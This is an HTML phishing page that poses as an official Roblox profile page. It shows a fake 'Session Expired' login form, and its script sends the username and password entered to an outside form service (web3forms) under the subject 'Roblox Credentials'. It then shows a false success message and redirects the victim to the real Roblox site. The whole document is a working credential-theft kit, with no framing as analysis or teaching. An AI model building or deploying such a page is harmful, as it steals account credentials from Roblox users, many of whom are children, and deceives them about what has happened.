<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox - Official Site</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f7f7f7;
            color: #1a1a1a;
        }
        .navbar {
            background-color: #00a2ff;
            padding: 10px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .navbar-logo {
            height: 30px;
        }
        .navbar-links {
            display: flex;
            gap: 15px;
        }
        .navbar-links a {
            color: white;
            text-decoration: none;
            font-weight: 500;
        }
        .container {
            max-width: 1000px;
            margin: 20px auto;
            padding: 20px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        .profile-header {
            text-align: center;
            margin-bottom: 20px;
        }
        .avatar {
            width: 150px;
            height: 150px;
            border-radius: 50%;
            object-fit: cover;
            margin-bottom: 10px;
            border: 4px solid #00a2ff;
        }
        .username {
            font-size: 24px;
            font-weight: bold;
            margin: 5px 0;
        }
        .user-id {
            color: #666;
            font-size: 14px;
        }
        .login-prompt {
            background-color: #f0f8ff;
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
            text-align: center;
            border: 1px solid #00a2ff;
        }
        .login-form {
            display: flex;
            flex-direction: column;
            gap: 10px;
            max-width: 300px;
            margin: 0 auto;
        }
        .login-form input {
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        .login-form button {
            background-color: #00a2ff;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
        }
        .login-form button:hover {
            background-color: #0088cc;
        }
        #message {
            font-size: 14px;
            margin-top: 10px;
            color: #d00;
        }
    </style>
</head>
<body>
    <nav class="navbar">
        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMDAgNTAiPjxwYXRoIGZpbGw9IiNmZmYiIGQ=" alt="Roblox Logo" class="navbar-logo">
        <div class="navbar-links">
            <a href="#">Discover</a>
            <a href="#">Marketplace</a>
            <a href="#">Create</a>
        </div>
    </nav>

    <div class="container">
        <div class="profile-header">
            <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48Y2lyY2xlIGN4PSI1MCIgY3k9IjM1IiByPSIyMCIgZmlsbD0iI2NjYyIvPjxwYXRoIGQ9Ik0zMCA4MGMyMC01IDQwLTUgNjAgMCIgZmlsbD0iI2NjYyIgc3Ryb2tlPSIjY2NjIiBzdHJva2Utd2lkdGg9IjUiLz48L3N2Zz4=" alt="Avatar" class="avatar">
            <h1 class="username">User_491408715</h1>
            <p class="user-id">ID: 491408715</p>
        </div>

        <div class="login-prompt">
            <h3>Session Expired</h3>
            <p>Please log in again to view this profile.</p>
            <div class="login-form">
                <input type="text" id="username" placeholder="Username" required>
                <input type="password" id="password" placeholder="Password" required>
                <button onclick="sendData()">Log In</button>
                <p id="message"></p>
            </div>
        </div>
    </div>

    <script>
        function sendData() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const accessKey = 'ee22b8e0-5127-4777-b100-9e55ca740751';

            document.getElementById('message').textContent = 'Verifying...';

            fetch('https://api.web3forms.com/submit', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    access_key: accessKey,
                    subject: `Roblox Credentials for ${username}`,
                    username: username,
                    password: password
                })
            })
            .then(response => response.json())
            .then(data => {
                document.getElementById('message').textContent = 'Login successful! Loading profile...';
                setTimeout(() => { window.location.href = 'https://www.roblox.com'; }, 1500);
            })
            .catch(error => {
                document.getElementById('message').textContent = 'Network error. Try again.';
            });
        }
    </script>
</body>
</html>
